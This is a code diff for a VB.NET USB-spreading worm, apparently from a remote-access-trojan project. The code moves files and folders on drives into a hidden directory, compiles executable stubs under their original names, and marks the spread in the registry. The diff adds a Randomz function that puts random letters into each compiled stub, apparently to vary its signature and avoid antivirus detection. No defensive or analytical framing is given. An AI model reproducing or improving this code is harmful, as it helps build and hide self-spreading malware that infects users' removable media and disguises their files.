@@ -84,7 +84,7 @@ RE:
                                 Try
                                     IO.File.Move(Files, P & MyDir & "\" & GetFileName(Files))
                                 Catch : End Try
-                                Compile(Stub.Replace("%A%", MyDir & "\" & MyPath).Replace("%B%", MyDir & "\" & GetFileName(Files)).Replace("%C%", Assemb), Files, EX, True)
+                                Compile(Stub.Replace("%A%", MyDir & "\" & MyPath).Replace("%B%", MyDir & "\" & GetFileName(Files)).Replace("%C%", Assemb).Replace("Nervousness", Randomz(6)), Files, EX, True)
                                 If Not GTV("USB") = "Spreaded!" Then
                                     STV("USB", "Spreaded!")
                                 End If
@@ -94,7 +94,7 @@ RE:
                             Try
                                 IO.File.Move(Files, P & MyDir & "\" & GetFileName(Files))
                             Catch : End Try
-                            Compile(Stub.Replace("%A%", MyDir & "\" & MyPath).Replace("%B%", MyDir & "\" & GetFileName(Files)).Replace("%C%", Assemb), Files, EX, True)
+                            Compile(Stub.Replace("%A%", MyDir & "\" & MyPath).Replace("%B%", MyDir & "\" & GetFileName(Files)).Replace("%C%", Assemb).Replace("Nervousness", Randomz(6)), Files, EX, True)
                         End If
                     End If
                 Catch : End Try
@@ -105,7 +105,7 @@ RE:
                 If Not Exists(P & MyDir & "\" & GetFileName(Directorys)) Then
                     If Not GetFileName(P) = MyDir Then
                         Move(Directorys, P & MyDir & "\" & GetFileName(Directorys))
-                        Compile(Stub.Replace("%A%", MyDir & "\" & MyPath).Replace("%B%", MyDir & "\" & GetFileName(Directorys)).Replace("%C%", Assemb), Directorys, Nothing, False)
+                        Compile(Stub.Replace("%A%", MyDir & "\" & MyPath).Replace("%B%", MyDir & "\" & GetFileName(Directorys)).Replace("%C%", Assemb).Replace("Nervousness", Randomz(6)), Directorys, Nothing, False)
                     End If
                 End If
             Catch : End Try
@@ -181,7 +181,6 @@ RE:
             Return ""
         End Try
     End Function
-
     Private Shared Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
         Try
             Registry.CurrentUser.CreateSubKey("Software\" & HWID).SetValue(n, t)
@@ -189,6 +188,18 @@ RE:
         Catch ex As Exception
             Return False
         End Try
+    End Function
+	    Public Shared Function Randomz(ByVal L As Integer)
+        Dim validchars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        Dim sb As New System.Text.StringBuilder()
+        Dim rand As New Random()
+        For i As Integer = 1 To L
+            Dim idx As Integer = rand.Next(0, validchars.Length)
+            Dim randomChar As Char = validchars(idx)
+            sb.Append(randomChar)
+        Next i
+        Dim randomString = sb.ToString()
+        Return randomString
     End Function
 
 End Class
